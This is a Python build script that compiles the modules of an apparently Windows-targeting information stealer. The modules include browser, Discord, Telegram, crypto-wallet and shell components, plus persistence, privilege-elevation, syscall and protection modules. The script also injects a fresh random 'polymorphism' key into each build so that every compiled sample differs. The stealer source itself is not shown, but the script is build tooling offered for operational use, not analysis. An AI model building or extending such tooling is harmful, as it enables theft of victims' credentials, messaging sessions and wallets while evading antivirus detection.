import os
import subprocess
import random
import re

def generate_compile_key():
    """Generate a unique 32-byte key for ChaCha20"""
    return [random.randint(0, 255) for _ in range(32)]

def inject_key_into_file(file_path, key):
    """Inject the unique key into SafetyManager.cs"""
    if not os.path.exists(file_path):
        return False
        
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Format the key as a C# byte array
    key_str = ', '.join(f'0x{k:02X}' for k in key)
    
    # Use regex to find the _compileKey array content
    pattern = r'(private static readonly byte\[\] _compileKey = new byte\[32\] \{)(.*?)(\};)'
    replacement = r'\1 ' + key_str + r' \3'
    
    new_content = re.sub(pattern, replacement, content, flags=re.DOTALL)
    
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(new_content)
    return True

# Ensure we are running from the root directory
os.chdir(os.path.dirname(os.path.abspath(__file__)) + "/..")

CSC_PATH = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
BIN_DIR = "bin"
DEFENSE_DIR = "defense"
NATIVE_DIR = "native_modules"

if not os.path.exists(BIN_DIR):
    os.makedirs(BIN_DIR)

modules = [
    # Defense & Infrastructure
    (DEFENSE_DIR, ["SafetyManager.cs", "ElevationService.cs", "SyscallManager.cs", "Protector.cs", "APIConstants.cs"], "SafetyManager.dll", "/target:library /r:System.Security.dll /r:System.Management.dll /r:System.Core.dll"),
    (DEFENSE_DIR, "persist.cs", "persist.dll", "/target:library /r:bin\\SafetyManager.dll"),
    (DEFENSE_DIR, "launcher.cs", "launcher.exe", f"/target:exe /r:bin\\SafetyManager.dll /r:System.Management.dll"),

    # Stealers & Native Modules
    (NATIVE_DIR, "networking.cs", "networking.dll", "/target:library /r:bin\\SafetyManager.dll /r:System.Net.Http.dll /r:System.dll"),
    (NATIVE_DIR, "BrowserManager.cs", "browser.dll", "/target:library /r:bin\\networking.dll /r:bin\\SafetyManager.dll /r:System.Net.Http.dll /r:System.dll /r:System.IO.Compression.FileSystem.dll"),
    (NATIVE_DIR, "discord.cs", "discord.dll", "/target:library /r:bin\\SafetyManager.dll /r:System.Security.dll"),
    (NATIVE_DIR, "telegrab.cs", "telegrab.dll", "/target:library /r:bin\\SafetyManager.dll"),
    (NATIVE_DIR, "wallets.cs", "wallets.dll", "/target:library /r:bin\\SafetyManager.dll"),
    (NATIVE_DIR, "system.cs", "syscore.dll", "/target:library /r:bin\\SafetyManager.dll /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll /r:System.dll /r:System.Core.dll"),
    (NATIVE_DIR, "bridge.cs", "bridge.dll", "/target:library /r:bin\\SafetyManager.dll /r:System.Net.Http.dll /r:System.dll"),
    (NATIVE_DIR, "software.cs", "software.dll", "/target:library /r:bin\\SafetyManager.dll /r:System.dll /r:System.Core.dll"),
    (NATIVE_DIR, "pe_utils.cs", "pe_utils.dll", "/target:library /r:bin\\SafetyManager.dll"),
    (NATIVE_DIR, "shell.cs", "shell.dll", "/target:library /r:bin\\SafetyManager.dll /r:System.dll /r:System.Core.dll")
]


def compile_all():
    print("Injecting unique polymorphism keys...")
    new_key = generate_compile_key()
    if inject_key_into_file(os.path.join(DEFENSE_DIR, "SafetyManager.cs"), new_key):
        print("[OK] Unique key injected into SafetyManager.cs")
    else:
        print("[ERROR] Failed to inject key into SafetyManager.cs")

    print("\nCompiling Native DLLs...")
    for folder, src, out, target in modules:
        # src может быть строкой или списком файлов
        if isinstance(src, list):
            src_paths = [os.path.join(folder, s) for s in src]
            label = ", ".join(src)
        else:
            src_paths = [os.path.join(folder, src)]
            label = src

        out_path = os.path.join(BIN_DIR, out)

        missing = [p for p in src_paths if not os.path.exists(p)]
        if missing:
            print(f"❌ Not found: {', '.join(missing)}")
            continue

        print(f"Compiling {label} -> {out}...")
        cmd = [CSC_PATH] + target.split() + [f"/out:{out_path}"] + src_paths
        try:
            result = subprocess.run(cmd, check=False, capture_output=True)
            if result.returncode == 0:
                print(f"OK: {out} built successfully.")
            else:
                print(f"FAILED: {out} build FAILED:")
                error_msg = result.stderr.decode('cp1251', errors='ignore')
                if not error_msg:
                    error_msg = result.stdout.decode('cp1251', errors='ignore')
                print(error_msg.replace('\r', ''))
        except Exception as e:
            print(f"❌ Runtime error during compilation of {out}: {e}")

if __name__ == "__main__":
    if not os.path.exists(CSC_PATH):
        print(f"❌ CSC compiler not found at {CSC_PATH}")
    else:
        compile_all()
        print("\nDone. You can now run 'python test_native_modules.py'")
